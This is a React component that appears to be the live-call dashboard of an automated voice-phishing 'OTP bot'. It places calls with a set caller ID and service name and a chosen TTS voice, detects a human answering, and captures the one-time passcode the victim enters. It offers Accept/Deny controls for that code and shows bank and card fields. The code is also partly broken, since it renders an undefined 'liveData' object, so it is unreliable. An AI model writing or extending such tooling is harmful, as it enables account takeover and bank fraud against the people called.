import React, { useState, useEffect } from 'react';
import { Button } from './ui/button';
import { Phone, PhoneOff } from 'lucide-react';
import api from '../services/api';
import { toast } from 'sonner';

export default function LiveCallMonitor({ callId, callData, onClose }) {
  const [events, setEvents] = useState([]);
  const [otpCode, setOtpCode] = useState(null);
  const [showAcceptDeny, setShowAcceptDeny] = useState(false);
  const [callStatus, setCallStatus] = useState('initiated');
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // Poll for call updates every 1 second for real-time feel
    const interval = setInterval(async () => {
      try {
        const response = await api.get(`/calls/${callId}`);
        const call = response.data;
        
        // Update events
        const callEvents = call.events || [];
        setEvents(callEvents.reverse()); // Newest first
        setCallStatus(call.status || 'initiated');
        
        // Check for OTP
        if (call.otp_code && !showAcceptDeny) {
          setOtpCode(call.otp_code);
          setShowAcceptDeny(true);
        }
        
        setIsLoading(false);
        
        // Stop polling if call is completed
        if (call.status === 'completed' || call.status === 'failed') {
          clearInterval(interval);
        }
      } catch (error) {
        console.error('Error fetching call data:', error);
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [callId, showAcceptDeny]);

  const handleAccept = async () => {
    try {
      await api.post(`/calls/${callId}/accept`);
      toast.success('OTP Accepted');
      setShowAcceptDeny(false);
    } catch (error) {
      toast.error('Failed to accept');
    }
  };

  const handleDeny = async () => {
    try {
      await api.post(`/calls/${callId}/deny`);
      toast.success('OTP Denied');
      setShowAcceptDeny(false);
    } catch (error) {
      toast.error('Failed to deny');
    }
  };

  const handleHangup = async () => {
    try {
      await api.post(`/calls/${callId}/hangup`);
      toast.success('Call terminated');
      onClose();
    } catch (error) {
      toast.error('Failed to hangup call');
    }
  };

  const getEventIcon = (eventType) => {
    switch(eventType) {
      case 'call_initiated': return '📱';
      case 'call_ringing': return '📞';
      case 'call_answered': return '☎️';
      case 'human_detected': return '🙋';
      case 'first_input_received': return '1️⃣';
      case 'otp_received': return '🕵️';
      case 'call_completed': return '🏁';
      default: return '📋';
    }
  };

  return (
    <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
      <div className="bg-[#0a0a0a] border border-green-500/30 rounded-xl p-6 max-w-4xl w-full max-h-[90vh] overflow-hidden flex flex-col">
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-full bg-green-500/20 flex items-center justify-center">
              <Phone className="w-6 h-6 text-green-500" />
            </div>
            <div>
              <h2 className="text-2xl font-bold text-white">Live Call Monitor</h2>
              <p className="text-gray-400 text-sm">Call ID: {callId.slice(0, 8)}...</p>
            </div>
          </div>
        </div>

        {/* Status Section */}
        <div className="space-y-4 mb-6">
          <div className="bg-[#0a0a0a] rounded-lg p-4 border border-gray-800">
            <h3 className="text-green-400 font-semibold mb-3">Status Information</h3>
            <div className="grid grid-cols-2 gap-3 text-sm">
              <div>
                <span className="text-gray-400">Status:</span>
                <span className="text-white ml-2 font-medium">{liveData.status}</span>
              </div>
              <div>
                <span className="text-gray-400">Answered By:</span>
                <span className="text-white ml-2 font-medium uppercase">{liveData.answered_by}</span>
              </div>
              <div>
                <span className="text-gray-400">Code:</span>
                <span className="text-white ml-2 font-medium">{liveData.code}</span>
              </div>
              <div>
                <span className="text-gray-400">Recording URL:</span>
                <span className="text-white ml-2 font-medium">{liveData.recording_url}</span>
              </div>
              <div className="col-span-2">
                <span className="text-gray-400">Responses:</span>
                <span className="text-white ml-2 font-medium">{liveData.responses}</span>
              </div>
            </div>
          </div>

          {/* Call Information */}
          <div className="bg-[#0a0a0a] rounded-lg p-4 border border-gray-800">
            <h3 className="text-green-400 font-semibold mb-3">Call Information</h3>
            <div className="grid grid-cols-2 gap-3 text-sm">
              <div>
                <span className="text-gray-400">Caller ID:</span>
                <span className="text-white ml-2 font-medium">{callData.from_number}</span>
              </div>
              <div>
                <span className="text-gray-400">Recipient Name:</span>
                <span className="text-white ml-2 font-medium">{callData.recipient_name}</span>
              </div>
              <div>
                <span className="text-gray-400">Recipient Number:</span>
                <span className="text-white ml-2 font-medium">{callData.to_number}</span>
              </div>
              <div>
                <span className="text-gray-400">Service Name:</span>
                <span className="text-white ml-2 font-medium">{callData.service_name}</span>
              </div>
              <div>
                <span className="text-gray-400">Required Digit:</span>
                <span className="text-white ml-2 font-medium">{callData.digits || 6}</span>
              </div>
              <div>
                <span className="text-gray-400">Card Type:</span>
                <span className="text-white ml-2 font-medium">-</span>
              </div>
              <div>
                <span className="text-gray-400">Bank Name:</span>
                <span className="text-white ml-2 font-medium">-</span>
              </div>
              <div>
                <span className="text-gray-400">Card Ending:</span>
                <span className="text-white ml-2 font-medium">-</span>
              </div>
              <div>
                <span className="text-gray-400">Language:</span>
                <span className="text-white ml-2 font-medium">{callData.language || 'en-US'}</span>
              </div>
              <div>
                <span className="text-gray-400">Voice:</span>
                <span className="text-white ml-2 font-medium">{callData.tts_voice}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Action Button */}
        <div className="flex gap-3">
          <Button
            onClick={handleHangup}
            className="flex-1 bg-red-600 hover:bg-red-700 text-white"
            data-testid="hangup-button"
          >
            <PhoneOff className="w-4 h-4 mr-2" />
            HangUp
          </Button>
          <Button
            onClick={onClose}
            variant="outline"
            className="flex-1 border-gray-700 hover:bg-gray-800"
          >
            Close Monitor
          </Button>
        </div>

        {/* Loading Footer */}
        {isLoading && (
          <div className="mt-4 text-center text-gray-400 text-sm">
            Fetching data. Please do not refresh browser.
          </div>
        )}
      </div>
    </div>
  );
}
